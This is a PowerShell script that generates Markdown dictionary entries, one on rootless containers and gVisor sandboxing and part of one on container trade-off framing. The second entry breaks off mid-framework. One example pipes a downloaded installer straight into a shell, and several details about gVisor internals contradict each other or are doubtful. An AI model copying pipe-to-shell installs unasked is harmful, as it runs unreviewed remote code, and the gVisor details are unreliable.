# ALWAYS run with: pwsh -ExecutionPolicy Bypass -File tmp\write_ctr_b3.ps1
Set-Location "C:\ASK\MyWorkspace\sk-keys"
$base = "dictionary\tier-6-infrastructure-devops\CTR-containers"

# ── CTR-051 ──────────────────────────────────────────────────────────────
$ctr051 = @'
---
id: CTR-051
title: "Container Security Research (Rootless, gVisor)"
category: Containers
tier: tier-6-infrastructure-devops
folder: CTR-containers
difficulty: ★★★
depends_on: CTR-017, CTR-021, CTR-044
used_by: CTR-054
related: CTR-044, CTR-049
tags:
  - containers
  - security
  - deep-dive
  - advanced
  - first-principles
status: complete
version: 1
layout: default
parent: "Containers"
grand_parent: "Technical Dictionary"
nav_order: 51
permalink: /ctr/container-security-research-rootless-gvisor/
---

# CTR-051 - Container Security Research (Rootless, gVisor)

⚡ TL;DR - Rootless containers (user namespaces) and gVisor (user-space kernel) are complementary advanced isolation techniques: rootless eliminates host root privilege; gVisor reduces kernel attack surface - together they provide defense-in-depth beyond standard securityContext controls.

| Metadata        |                          |     |
| :-------------- | :----------------------- | :-- |
| **Depends on:** | CTR-017, CTR-021, CTR-044 |     |
| **Used by:**    | CTR-054                  |     |
| **Related:**    | CTR-044, CTR-049         |     |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
Standard container security (non-root user, dropped capabilities,
seccomp) reduces attack surface but does not fundamentally change the
threat model: containers still run on the host kernel, and root inside
a container (even with `runAsNonRoot: true` at the pod level) can still
become host root via a kernel exploit. The security baseline is a
reduction of risk, not a change of trust boundary.

**THE BREAKING POINT:**
A container escape CVE is disclosed. The attack vector requires the
container to be running as root (UID 0) or to have the `SYS_PTRACE`
capability. Standard security hardening (non-root + dropped capabilities)
blocks this specific CVE. But the next CVE might not require these
preconditions. Teams want a more fundamental isolation guarantee.

**THE INVENTION MOMENT:**
Two orthogonal approaches emerged:

1. **Rootless containers** (user namespace isolation): root inside the
   container is mapped to an unprivileged UID on the host. Even if the
   container is fully compromised, the attacker operates as an
   unprivileged user on the host.
2. **gVisor** (kernel interposition): a user-space kernel intercepts
   all syscalls from container processes. The container never directly
   calls the host kernel. A kernel vulnerability requires first
   compromising gVisor's user-space kernel.

**EVOLUTION:**
2013: User namespaces merged into Linux 3.8. 2019: gVisor (runsc) open-
sourced by Google. 2020: Rootless Docker becomes stable. 2021: Rootless
Kubernetes (kubelet in user namespace) becomes feasible. 2022: Kata
Containers 3.0 improves startup performance. 2023: gVisor adds io_uring
support (previously a compatibility gap). Confidential computing
(Kata + AMD SEV/Intel TDX) provides hardware-attested isolation.

---

### 📘 Textbook Definition

**Rootless containers** use Linux user namespaces to run container
runtimes and containers without any host root privilege. The container
runtime daemon (Podman, rootless Docker, rootless containerd) runs as
an unprivileged user; root (UID 0) inside the container maps to the
user's UID on the host via the user namespace UID mapping.

**gVisor** is a user-space kernel that intercepts syscalls made by
container processes and implements them in user space, reducing the
attack surface of the host kernel. Container processes communicate with
gVisor's Sentry (the kernel implementation) rather than directly with
the host kernel. Sentry makes a minimal set of host syscalls on behalf
of the container.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
Rootless containers remove host root privilege; gVisor removes direct
host kernel access - each adds an independent isolation layer.

**One analogy:**

> Standard containers are like renting a flat with a shared building
> entrance (host kernel). Rootless containers give each tenant their
> own locked entrance (user namespace: even if a tenant breaks in, they
> are still just a tenant, not the building manager). gVisor is like
> adding an airlock between the flat and the building (syscall interposition:
> the tenant must go through the airlock, which screens all requests
> before they reach the building systems).

**One insight:**
Rootless and gVisor are orthogonal: rootless protects host privilege
escalation; gVisor protects kernel vulnerability exploitation. Using
both together means: (1) even if gVisor is bypassed, the attacker is
an unprivileged host user (rootless); (2) even if the container escapes
the user namespace, gVisor's syscall filter limits what it can do.

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**

1. **User namespaces map UID 0 inside to non-0 outside** - root in a
   rootless container is a fully unprivileged user on the host. This
   is the key security property: privilege escalation from inside the
   container cannot gain host root.
2. **gVisor interposes on the syscall interface** - all syscalls from
   the container go to gVisor's Sentry (a Go process in user space).
   Sentry implements the Linux ABI and makes selective host syscalls.
   A kernel CVE must first compromise Sentry before reaching the host.
3. **Rootless containers have reduced capability** - user namespace
   containers cannot bind to privileged ports (<1024), cannot change
   host network configuration, and have limited access to devices.
   These limitations are the security/capability trade-off.
4. **gVisor has syscall compatibility gaps** - not all Linux syscalls
   are implemented in gVisor's Sentry. Applications using unimplemented
   syscalls fail. `io_uring`, `ptrace`, and some `inotify` variants
   have had compatibility issues historically.

**DERIVED DESIGN:**
Given invariant 1: rootless containers are appropriate for any workload
where host root privilege is not required (which is almost all
application workloads). Given invariant 4: test application compatibility
with gVisor before production deployment. Maintain a compatibility matrix.

**THE TRADE-OFFS:**
**Gain (rootless):** Host root privilege eliminated. Even a container
escape results in an unprivileged host user, not root.
**Cost (rootless):** Network namespace setup requires `newuidmap`/
`newgidmap` helper binaries (setuid). Some host device access unavailable.
**Gain (gVisor):** Kernel attack surface reduced to Sentry's syscall
implementation. Two-layer defense.
**Cost (gVisor):** 10-30% CPU overhead per syscall. Startup latency.
Compatibility gaps with some applications.

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**
**Essential:** The isolation mechanisms (user namespace UID mapping,
syscall interposition) are genuinely novel kernel/user-space boundaries.
**Accidental:** Performance overhead of gVisor for workloads that do
not need kernel-level isolation.

---

### 🧪 Thought Experiment

**SETUP:**
A platform runs untrusted user code. Standard containers with seccomp
and non-root are deployed. An attacker submits code exploiting a kernel
vulnerability that works when called from a container with UID 0.

**WHAT HAPPENS WITHOUT ROOTLESS/GVISOR:**
The seccomp profile blocks most dangerous syscalls, but the vulnerability
is exploitable via a syscall that the seccomp profile permits (it was
not known to be dangerous when the profile was written). The attacker
gains kernel privileges and escapes to the host as root.

**WHAT HAPPENS WITH ROOTLESS + GVISOR:**
Layer 1 (gVisor): the syscall goes to gVisor's Sentry, not the host
kernel. The vulnerability is in the host kernel, not in Sentry. If
Sentry passes the syscall through (not all syscalls are intercepted),
it is a host syscall from an unprivileged process (not kernel context).
Layer 2 (rootless): even if Sentry is compromised, the container process
is mapped to an unprivileged UID on the host. Host root privilege is
not available to the attacker.

**THE INSIGHT:**
Layered isolation degrades gracefully. Each layer must be independently
defeated. The combination does not prevent all attacks but requires
an attacker to find and exploit two independent isolation mechanisms
rather than one. Defense-in-depth is the goal, not perfect isolation.

---

### 🧠 Mental Model / Analogy

> Imagine a secure document handling room. Standard container security
> is like working in a room with a locked door (namespaces + seccomp).
> Rootless containers add that even if you break out of the room, you
> are still just an ordinary staff member with no building keys (no host
> root privilege). gVisor adds a document shredder between the room
> and the filing system: all document requests go through a verifier
> that screens requests before they reach the actual files (syscall
> interposition).

Element mapping:

- **Locked room** = standard namespace isolation
- **Ordinary staff member** = unprivileged UID (rootless)
- **Building keys** = host root privilege
- **Document shredder/verifier** = gVisor Sentry
- **Filing system** = host kernel

Where this analogy breaks down: in the physical world, breaking out
of a room grants immediate access to the hallway; in containers, a
namespace escape still requires defeating additional isolation layers.

---

### 📶 Gradual Depth - Four Levels

**Level 1 - What it is (anyone can understand):**
Rootless containers run without needing system administrator privileges
on the host. gVisor adds an extra layer of protection between the
container and the computer's core operating system.

**Level 2 - How to use it (junior developer):**
For rootless Docker: `dockerd-rootless-setuptool.sh install` on the
host. Then use Docker normally. For rootless Kubernetes: use KIND with
rootless mode, or Podman in rootless mode.
For gVisor: install `runsc`, create a RuntimeClass, set
`runtimeClassName: gvisor` on pods that need sandboxed execution.

**Level 3 - How it works (mid-level engineer):**
Rootless: the container runtime (Podman, rootless containerd) starts
as a regular user. It creates a user namespace where UID 0 maps to the
current user's UID (e.g., 1000 on the host). Inside the namespace, the
runtime has full privileges (root in namespace). Outside, it is just
UID 1000. Network namespaces require `slirp4netns` or `pasta` for
userspace networking (no host network privilege needed).
gVisor: the container process communicates via a socket to the `runsc`
process (Sentry). Sentry implements the Linux ABI in Go, translating
container syscalls to a minimal set of host syscalls via a separate
sandbox process (Gofer). The host kernel is called only by Gofer with
a highly restricted seccomp filter.

**Level 4 - Why it was designed this way (senior/staff):**
Rootless containers address the daemon-privilege problem: Docker daemon
running as root is a high-value attack target. Any vulnerability in the
Docker daemon gives the attacker host root. By running the daemon as
an unprivileged user, the attack surface shifts: the daemon can still
be compromised, but the attacker is limited to the user's permissions.
gVisor addresses the kernel surface problem: the Linux kernel has 350+
syscalls, each a potential vulnerability surface. gVisor's Sentry
implements only the syscalls containers actually need, reducing the
host kernel surface accessible from container code to a small set of
well-audited paths.

**Expert Thinking Cues:**

- "Does this workload need host root for any reason? If no, rootless
  should be the default."
- "Does this workload use syscalls that gVisor does not implement?
  Run compatibility tests before committing to gVisor in production."
- "What is the performance overhead of gVisor for this specific workload?
  I/O-intensive and syscall-heavy workloads see higher overhead."

---

### ⚙️ How It Works (Mechanism)

**ROOTLESS CONTAINER UID MAPPING:**

```
Host UID: 1000 (alice)
  |
  v
User namespace created by rootless runtime
  UID mapping: 0 (container root)  -> 1000 (host)
               1 (container user)  -> 100001 (host)
               ...
  |
  v
Inside container: ps shows UID 0 (root)
On host:         ps shows UID 1000 (alice)
File written as  container UID 0
  -> stored on host filesystem as UID 1000
```

**GVISOR SYSCALL PATH:**

```
Container process (e.g. nginx)
  | syscall: read(fd, buf, size)
  v
gVisor Sentry (user-space kernel, Go)
  | Sentry handles the read in user space
  | OR delegates to Gofer (for file I/O)
  v
Gofer process (file system proxy)
  | Gofer makes host syscall: read(fd, buf, size)
  | Gofer has restrictive seccomp filter
  v
Host kernel (minimal attack surface)
```

---

### 🔄 The Complete Picture - End-to-End Flow

**NORMAL FLOW (gVisor container start):**

```
Kubelet -> CRI call to containerd
  |
  v
containerd: RuntimeClass = gvisor
  -> invoke runsc (gVisor OCI runtime)
  |           ← YOU ARE HERE
  v
runsc creates Sentry + Gofer processes
  |
  v
Container process starts
  | All syscalls -> Sentry (not host kernel)
  v
Sentry handles or forwards to Gofer
  |
  v
Gofer -> host kernel (restricted interface)
```

**FAILURE PATH:**
Container application uses `io_uring` for high-performance I/O. gVisor
does not implement `io_uring` in older versions. Application crashes
with `ENOSYS` (function not implemented). Falls back to standard
`read`/`write` if the application has a fallback path; otherwise fails.

**WHAT CHANGES AT SCALE:**
At scale, gVisor overhead accumulates. For a service making 100,000
syscalls/second (network-intensive), 15% overhead = 15,000 extra
syscalls/second intercepted by Sentry. Monitor CPU utilisation relative
to standard containerd. Use gVisor only where the security benefit
justifies the overhead.

---

### 💻 Code Example

```bash
# Set up rootless Docker (no sudo required after setup)
curl -fsSL https://get.docker.com/rootless | sh
# OR on systems with systemd:
dockerd-rootless-setuptool.sh install
systemctl --user start docker

# Verify rootless mode
docker info | grep "rootless"
# Security Options: rootless

# Run a container - daemon runs as current user
docker run --rm ubuntu id
# uid=0(root) gid=0(root) - root inside container
# But on host:
ps aux | grep dockerd
# dockerd is running as current user UID, not root
```

```yaml
# gVisor RuntimeClass configuration
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc    # gVisor OCI runtime binary name

---
# Pod using gVisor (sandboxed runtime)
apiVersion: v1
kind: Pod
metadata:
  name: sandboxed-workload
spec:
  runtimeClassName: gvisor
  containers:
  - name: app
    image: myapp:v1.0
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      readOnlyRootFilesystem: true
    resources:
      limits:
        cpu: "500m"
        memory: "256Mi"
```

```bash
# Verify gVisor is intercepting syscalls
# (inside a gVisor container, dmesg shows gVisor kernel)
kubectl exec -it sandboxed-workload -- dmesg 2>/dev/null | \
  grep -i "gvisor\|runsc"
# Should show gVisor kernel messages, not Linux kernel messages

# Performance comparison (syscall overhead)
# Standard runc:
time kubectl run bench-runc --image=nginx \
  --restart=Never --rm -- \
  sh -c 'for i in $(seq 1 10000); do echo $i > /dev/null; done'

# gVisor:
time kubectl run bench-gvisor --image=nginx \
  --restart=Never --rm \
  --overrides='{"spec":{"runtimeClassName":"gvisor"}}' -- \
  sh -c 'for i in $(seq 1 10000); do echo $i > /dev/null; done'
```

**How to test / verify correctness:**

```bash
# Test rootless: verify runtime is not running as root
systemctl --user status docker | grep "UID\|uid"

# Test gVisor: run gVisor test suite
docker run --runtime=runsc \
  gcr.io/gvisor/ubuntu:latest /bin/true
echo "Exit: $?"  # 0 = gVisor working

# Test application compatibility with gVisor
# Run your application's test suite with gVisor runtime
kubectl run compat-test --image=myapp \
  --restart=Never \
  --overrides='{"spec":{"runtimeClassName":"gvisor"}}' \
  -- /app/run-tests.sh
kubectl logs compat-test
```

---

### ⚖️ Comparison Table

| Technique | Host Root Required | Kernel Attack Surface | Compatibility | Overhead |
|---|---|---|---|---|
| Standard containerd + seccomp | Yes (daemon) | Full (all syscalls) | Full | <1% |
| Rootless containerd | No | Full (all syscalls) | ~Full (some device limits) | <5% |
| gVisor (runsc) | Yes (daemon) | Minimal (Sentry-filtered) | Partial (syscall gaps) | 10-30% CPU |
| Rootless + gVisor | No | Minimal | Partial | 15-35% CPU |
| Kata Containers | Yes (daemon) | None (own kernel) | Full (VM kernel) | 100-200ms start |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| "Rootless containers cannot run as root inside the container" | Rootless containers can run processes as UID 0 inside the container - that's the point of the user namespace mapping. Root inside = unprivileged user outside. |
| "gVisor provides the same isolation as Kata Containers" | gVisor shares the host kernel (via Gofer's restricted syscall set). Kata Containers runs a full VM with a separate Linux kernel. Kata provides stronger isolation at higher overhead. |
| "Rootless containers have the same network capabilities as root-daemon containers" | Rootless containers use userspace networking (slirp4netns or pasta) which has slightly higher latency and cannot use raw sockets or some advanced networking features. |
| "gVisor is a VM" | gVisor is a user-space process implementing the Linux kernel ABI. It shares the host kernel for its own system calls. A VM has a separate kernel and hardware virtualisation. |
| "Rootless + gVisor together provide VM-level isolation" | They provide complementary software isolation: rootless removes host root privilege, gVisor reduces kernel attack surface. Neither individually nor together do they provide hardware-enforced VM isolation (which requires a hypervisor). |

---

### 🚨 Failure Modes & Diagnosis

**Failure Mode 1: gVisor Application Incompatibility**
**Symptom:** Application runs correctly with standard containerd but
crashes with `ENOSYS` or unexpected errors when switched to gVisor.
**Root Cause:** Application uses a Linux syscall not implemented by
gVisor's Sentry. Common culprits: `io_uring`, `ptrace` (debugging tools),
`userfaultfd`, some `inotify` variants, `splice` for certain use cases.
**Diagnostic:**

```bash
# Run gVisor with debug logging to capture syscall errors
kubectl run debug --image=myapp \
  --overrides='{
    "spec": {
      "runtimeClassName": "gvisor",
      "containers": [{
        "name": "debug",
        "image": "myapp",
        "env": [{"name": "RUNSC_DEBUG", "value": "1"}]
      }]
    }
  }'
kubectl logs debug 2>&1 | grep -i "unsupported\|ENOSYS"
```

**Fix:** If the syscall is `io_uring`: upgrade gVisor (io_uring support
added in 2023). If the syscall is essential and not supported: use Kata
Containers instead (full kernel compatibility).
**Prevention:** Run application compatibility tests against gVisor in
staging before production adoption. Maintain a compatibility matrix
by application type (database: avoid gVisor; stateless API: usually
compatible).

---

**Failure Mode 2: Rootless Container Network Performance Degradation**
**Symptom:** Rootless containers have measurably higher network latency
(5-15% compared to root-daemon containers). High-throughput network
workloads show reduced throughput.
**Root Cause:** Rootless containers use userspace networking (slirp4netns
or pasta) which routes packets through a userspace process rather than
the kernel directly. Each packet crosses the kernel/userspace boundary.
**Diagnostic:**

```bash
# Compare network latency
# Root-daemon container:
docker run --rm networkstatic/iperf3 iperf3 -c iperf.example.com

# Rootless container:
DOCKER_HOST=unix://$XDG_RUNTIME_DIR/docker.sock \
  docker run --rm networkstatic/iperf3 iperf3 -c iperf.example.com

# Compare throughput values
```

**Fix:** For network-intensive workloads: use standard root-daemon
containerd with enhanced securityContext rather than rootless. Rootless
is appropriate for CPU-bound or low-network workloads.
**Prevention:** Benchmark network-sensitive workloads against both
rootless and root-daemon before production deployment.

---

**Failure Mode 3: User Namespace Breakout via SetUID Binary (Security)**
**Symptom:** Security audit finds a setuid binary inside a rootless
container's image. If executed, it runs as UID 0 inside the user
namespace (which is an unprivileged UID outside).
**Root Cause:** Rootless containers allow setuid binaries to escalate
to UID 0 inside the user namespace. While this is "root inside a
user namespace" (not host root), it grants full namespace-level
capabilities.
**Diagnostic:**

```bash
# Find setuid binaries inside an image
docker export $(docker create myapp:v1.0) | \
  tar -t --full-time | \
  awk '{if ($1 ~ /s/) print $NF}'

# Alternative: use dive to inspect each layer
dive myapp:v1.0 | grep -i "setuid\|suid"
```

**Fix:** Remove setuid binaries from production images. Use distroless
images (no setuid binaries by design). In Kubernetes, set
`allowPrivilegeEscalation: false` to prevent setuid escalation.
**Prevention:** Scan images for setuid binaries in CI. Block images
with setuid binaries via admission policy (Kyverno or OPA).

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- [[CTR-017 - Linux Namespaces]] - user namespaces (the rootless mechanism)
- [[CTR-021 - Container Security]] - baseline container security
- [[CTR-044 - Container Security Architecture]] - defense-in-depth framework

**Builds On This (learn these next):**

- [[CTR-054 - Container Security Mental Model]] - threat model thinking

**Alternatives / Comparisons:**

- [[CTR-044 - Container Security Architecture]] - standard security controls
- [[CTR-049 - Linux Namespace and Cgroup Architecture]] - the underlying mechanism

---

### 📌 Quick Reference Card

```
┌────────────────────────────────────────────────────┐
│ WHAT IT IS  │ Advanced isolation: rootless+gVisor │
│ PROBLEM     │ Standard controls don't change trust │
│ KEY INSIGHT │ Rootless: no host root. gVisor: no  │
│             │ direct kernel access.                │
│ USE WHEN    │ Multi-tenant, untrusted code, regs  │
│ AVOID WHEN  │ Network-intensive (rootless perf) or│
│             │ syscall-heavy (gVisor compat)        │
│ TRADE-OFF   │ Isolation vs. performance + compat  │
│ ONE-LINER   │ Rootless + gVisor = defense layers  │
│ NEXT EXPLORE│ CTR-054 Security Mental Model       │
└────────────────────────────────────────────────────┘
```

**If you remember only 3 things:**

1. Rootless containers map container root (UID 0) to an unprivileged
   host UID via user namespaces - a full container escape gives the
   attacker only unprivileged host access.
2. gVisor interposes on syscalls in user space - the host kernel is
   not directly accessible from container code, adding a two-layer
   buffer against kernel exploits.
3. Rootless and gVisor are orthogonal and complementary - use both
   for maximum isolation; either alone covers different attack vectors.

**Interview one-liner:**
"Rootless containers use user namespace UID mapping to eliminate host
root privilege (escape = unprivileged host user); gVisor uses a user-
space kernel to intercept all syscalls (escape = gVisor compromise
first, then host kernel); together they provide defense-in-depth beyond
standard securityContext controls."

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
Defense-in-depth security layers should be orthogonal (protecting
different attack vectors) rather than redundant (protecting the same
vector twice). Rootless containers protect privilege escalation; gVisor
protects kernel surface exposure. Neither duplicates the other. Each
layer degrades an attacker's capabilities independently.

**Where else this pattern appears:**

- **Network security zones:** DMZ (limits external access), firewall
  (limits traffic type), IDS (detects anomalous traffic), and endpoint
  security (limits host privilege). Each layer addresses a different
  attack phase.
- **Database access control:** Network-level firewall (IP whitelisting),
  database authentication, role-based access control (schema level),
  and row-level security. An attacker who compromises one layer is
  constrained by the others.
- **Cryptographic protocol design:** TLS provides: certificate
  authentication (prevents MITM), symmetric encryption (prevents
  eavesdropping), and MAC (prevents tampering). Three orthogonal
  protections in one protocol.

---

### 💡 The Surprising Truth

gVisor's Sentry is written in Go, a garbage-collected language, running
as a user-space process that implements a Linux kernel. Every time a
container process makes a system call, it is handled by a Go goroutine
with garbage collection pauses. For most workloads, GC pauses are
imperceptible (<1ms). But for latency-sensitive workloads (trading
systems, real-time audio), GC pauses can cause tail latency spikes.
Google measured that gVisor's GC pauses cause p99.9 latency increases
of 2-5ms for syscall-heavy workloads. This is the hidden cost of
implementing a kernel in a GC language, and it is one of the reasons
gVisor is not recommended for latency-sensitive production workloads
despite its security benefits.

---

### 🧠 Think About This Before We Continue

**Q1 (C - Design Trade-off):** A platform team is choosing between
(a) standard containerd with strict seccomp + AppArmor profiles for
untrusted workloads, and (b) gVisor with default seccomp. Both aim to
limit the kernel attack surface. What are the trade-offs, and under
what threat model is each approach better?
*Hint:* seccomp + AppArmor is a policy-based approach (allowlist of
allowed syscalls/kernel actions). gVisor is an architecture-based
approach (user-space kernel interposition). What happens when a new
unknown-dangerous syscall is added to the Linux kernel? Which approach
adapts automatically?

**Q2 (E - First Principles):** In rootless containers, UID 0 inside
the user namespace maps to UID 100000 on the host. A container process
running as UID 0 creates a file. The file appears as UID 0 inside the
container and UID 100000 on the host. Now a second container (also
rootless, different user namespace) tries to read that file. Can it?
Why or why not?
*Hint:* File permissions are stored as host UIDs on the filesystem.
The second container has a different UID mapping (its UID 0 maps to
a different host UID, e.g. 200000). The file is owned by 100000 on
the host. From the second container's perspective, that is an unknown
UID with default permissions. What does the `other` permission bit
determine?

**Q3 (B - Scale):** A platform runs 1,000 gVisor containers. Each
Sentry process (per container) consumes approximately 50 MB of resident
memory overhead. What is the total memory overhead from gVisor Sentry
processes alone, and how does this compare to the memory overhead of
1,000 Kata Container VMs (each consuming ~128 MB for the VM kernel)?
*Hint:* Calculate both totals. Then consider: at what container count
does the memory overhead justify moving to a shared-kernel model (standard
containerd) with enhanced seccomp, vs. maintaining per-container Sentry
processes? What metric determines the crossover point?
'@

# ── CTR-052 ──────────────────────────────────────────────────────────────
$ctr052 = @'
---
id: CTR-052
title: Container Trade-off Framing
category: Containers
tier: tier-6-infrastructure-devops
folder: CTR-containers
difficulty: ★★★
depends_on: CTR-001, CTR-002, CTR-043
used_by: CTR-053
related: CTR-043, CTR-046
tags:
  - containers
  - architecture
  - mental-model
  - tradeoff
  - bestpractice
status: complete
version: 1
layout: default
parent: "Containers"
grand_parent: "Technical Dictionary"
nav_order: 52
permalink: /ctr/container-trade-off-framing/
---

# CTR-052 - Container Trade-off Framing

⚡ TL;DR - Container trade-off framing is a structured mental model for evaluating containerisation decisions across five axes: portability, isolation, operational complexity, startup latency, and security posture.

| Metadata        |                          |     |
| :-------------- | :----------------------- | :-- |
| **Depends on:** | CTR-001, CTR-002, CTR-043 |     |
| **Used by:**    | CTR-053                  |     |
| **Related:**    | CTR-043, CTR-046         |     |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
A team debates containerisation. One engineer argues "containers are
more secure." Another argues "VMs are more secure." A third argues
"containers are faster." A fourth says "containers add complexity."
All are partially correct. Without a structured trade-off framework,
the debate generates heat but no decision. The team either defers the
decision or makes it based on whoever argued most forcefully.

**THE BREAKING POINT:**
An organisation adopts containers for all workloads because "that's the
standard now." Databases are containerised on ephemeral storage (data
loss risk), real-time control systems are containerised with startup
latency requirements that containers cannot meet, and security teams
discover that containerised workloads have a shared kernel attack
surface they had not anticipated. The blanket adoption ignores the
fundamental trade-offs.

**THE INVENTION MOMENT:**
Container trade-off framing provides the vocabulary and axes to have
a productive decision conversation: instead of "are containers good?",
ask "which of the five trade-off axes matter most for this specific
workload, and does containerisation help or hurt on each?"

**EVOLUTION:**
2013: Containers first adopted for stateless web services (best fit).
2015: Teams begin containerising stateful workloads (fit is worse;
trade-offs become visible). 2017: Kubernetes adoption makes orchestration
operational complexity the dominant trade-off concern. 2019: Security
teams formalise the shared-kernel vs. VM-level isolation trade-off.
2021: Platform engineering matures the "developer experience" axis
(containers improve DX). 2023: Cloud cost and carbon efficiency become
new trade-off axes (containers improve density; this reduces cost and
energy per workload).

---

### 📘 Textbook Definition

**Container trade-off framing** is the structured analysis of container
adoption decisions across five axes: (1) **Portability** - how well
the workload moves between environments; (2) **Isolation** - the
security boundary between workloads; (3) **Operational complexity** -
the overhead of running and maintaining the platform; (4) **Startup
latency** - time from deployment trigger to ready workload; and
(5) **Security posture** - the attack surface and blast radius of a
compromise. Each workload is evaluated against each axis before a
containerisation decision is made.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
Before containerising, evaluate portability, isolation, ops complexity,
startup latency, and security posture - containers improve some and
worsen others.

**One analogy:**

> Container trade-off framing is like evaluating a new car. You don't
> ask "is this car good?" - you ask: how is the fuel efficiency (ops
> cost)? How fast can it accelerate (startup latency)? How many passengers
> (portability)? How crash-safe (isolation)? Is it easy to service
> (operational complexity)? Different buyers prioritise different axes,
> and the "best" car depends on the use case.

**One insight:**
Containers are not unconditionally better or worse than VMs or bare
metal for any given axis. The answer for each axis depends on the
workload type. The trade-off framing replaces "should we containerise?"
with "for this workload, what does containerising cost and gain on
each axis?"

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**

1. **Containers trade isolation for density** - sharing the host kernel
   enables more containers per host than VMs, but reduces the isolation
   boundary between workloads.
2. **Containers trade operational simplicity for portability** -
   containerisation adds platform complexity (registry, orchestrator,
   networking) in exchange for environment consistency.
3. **Startup latency is a direct container advantage** - containers
   start in milliseconds; VMs start in seconds. This is an unambiguous
   container win for autoscaling and serverless patterns.
4. **Stateful workloads have asymmetric trade-offs** - containers add
   complexity for stateful workloads (persistent volumes, backup,
   failover) without proportionally increasing portability (data
   locality reduces portability gains).

**DERIVED DESIGN:**
Given invariants 1 and 4: containers are best fit for stateless,
portable workloads where density and fast startup are valued. VMs remain
better for workloads requiring strong isolation (multi-tenant kernel
separation) or for stateful systems where container storage adds
complexity without proportional benefit.

**THE TRADE-OFFS:**
**Container gains:** Portability (run anywhere OCI runtime exists),
Density (more workloads per host), Startup speed (milliseconds vs.
seconds), Developer experience (same environment dev/prod).
**Container costs:** Isolation (shared kernel), Operational complexity
(registry + orchestrator + networking + storage), Security posture
(shared kernel attack surface).

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**
**Essential:** Any multi-environment workload has portability vs.
isolation vs. complexity trade-offs regardless of technology choice.
**Accidental:** The Kubernetes-specific operational overhead (CRD
proliferation, YAML engineering) is accidental complexity added on
top of the essential container trade-offs.

---

### 🧪 Thought Experiment

**SETUP:**
Three workloads to evaluate for containerisation:
(A) Stateless REST API, 20 instances, same binary dev/prod
(B) PostgreSQL database, primary+replica, 2TB data
(C) Real-time control system, requires <1ms response latency

**CONTAINER TRADE-OFF ANALYSIS:**

Workload A (REST API):
- Portability: HIGH (same image dev/staging/prod) - GAIN
- Isolation: LOW (shared kernel) - acceptable for trusted workload
- Ops complexity: MEDIUM (registry + K8s + service) - manageable
- Startup latency: FAST (milliseconds) - GAIN for autoscaling
- Security: shared kernel acceptable (trusted code)
- Decision: STRONG container fit

Workload B (PostgreSQL):
- Portability: LOW (2TB data is not portable; storage is local)
- Isolation: NEUTRAL (DBs historically on VMs with same limitations)
- Ops complexity: HIGH (PersistentVolume, backup, failover, operator)
- Startup latency: IRRELEVANT for persistent database
- Security: shared kernel is acceptable with proper controls
- Decision: WEAK container fit; consider managed database service

Workload C (Real-time control):
- Portability: LOW (hardware-specific timing requirements)
- Isolation: MEDIUM (container scheduling adds jitter)
- Ops complexity: HIGH (real-time scheduling not container-native)
- Startup latency: IRRELEVANT but runtime latency critical
- Security: standard isolation sufficient
- Decision: POOR container fit; bare metal or RT-patched VM better

**THE INSIGHT:**
The same technology decision has different trade-off profiles for
different workloads. Container trade-off framing makes the differences
explicit, enabling workload-specific decisions rather than a blanket
"containerise everything" policy.

---

### 🧠 Mental Model / Analogy

> Container trade-off framing is like evaluating a building material.
> Steel is strong, lightweight, and standardised (portability), but
> conducts heat (isolation issues with temperature) and requires specialised
> workers (operational complexity). Brick is heavier and site-specific
> (lower portability) but better insulating (isolation) and simpler to
> work with locally (lower operational complexity for traditional builders).
> Neither is universally better - the right choice depends on the
> building's requirements.

Element mapping:

- **Building material** = deployment technology (containers, VMs, bare metal)
- **Strength** = portability across environments
- **Thermal conductivity** = isolation quality
- **Worker specialisation** = operational complexity
- **Building requirements** = workload characteristics

Where this analogy breaks down: physical materials have fixed properties;
container technology evolves rapidly, and the trade-offs shift with
new capabilities (gVisor improves isolation; managed Kubernetes reduces
operational complexity).

---

### 📶 Gradual Depth - Four Levels

**Level 1 - What it is (anyone can understand):**
Container trade-off framing is a checklist of "what do we gain and
what do we lose?" when we choose containers for a specific application.
It prevents the mistake of treating containers as universally better
or worse.

**Level 2 - How to use it (junior developer):**
For each workload you are considering containerising, ask five questions:
(1) Do we need to run this in multiple environments? (2) How much
isolation do we need from other workloads? (3) Do we have the operational
knowledge to run containers? (4) Is fast startup time important?
(5) What is our security threat model? High scores across the board
suggest containers are a good fit; low scores suggest alternatives.

**Level 3 - How it works (mid-level engineer):**
Apply the five axes formally: Portability (number of target environments,
consistency requirements), Isolation (threat model, tenant trust level,
regulatory requirements), Operational complexity (team Kubernetes
maturity, platform team availability), Startup latency (autoscaling
requirements, cold start sensitivity), Security posture (attack surface
comparison: shared kernel vs. VM kernel vs. bare metal). Score each
1-5. Workloads with total scores < 15/25 warrant alternatives.

**Level 4 - Why it was designed this way (senior/staff):**
Container trade-off framing exists because the adoption curve of
containers outpaced the understanding of their limitations. Early
adopters containerised stateless workloads and got clear wins. As
adoption expanded to databases, real-time systems, and multi-tenant
environments, the trade-offs became visible but the framework for
discussing them was absent. The five axes were synthesised from the
recurring adoption failure patterns: isolation failures (security
incidents), startup latency surprises (real-time systems), and
operational complexity debt (kubernetes clusters nobody could operate).

**Expert Thinking Cues:**

- "Is this workload's primary portability requirement between environments
  or between cloud providers? Containers solve the former better."
- "What is the cost of operational complexity for this team? A team
  without Kubernetes experience should not be blocked on a K8s migration."
- "What is the isolation requirement? Shared tenants? Regulated data?
  These shift the isolation axis score significantly."

---

### ⚙️ How It Works (Mechanism)

**FIVE-AXIS SCORING FRAMEWORK:**

```
Axis 1: PORTABILITY
  5 = runs identical in dev/test/staging/prod/cloud-A/cloud-B
  3 = some environment-specific configuration
  1 = hardware-specific, single-environment

Axis 2: ISOLATION REQUIREMENT
  5 = strong isolation needed (multi-tenant, regulated)
  3 = standard isolation (single tenant, internal)
  1 = co-location acceptable (same team, same trust)
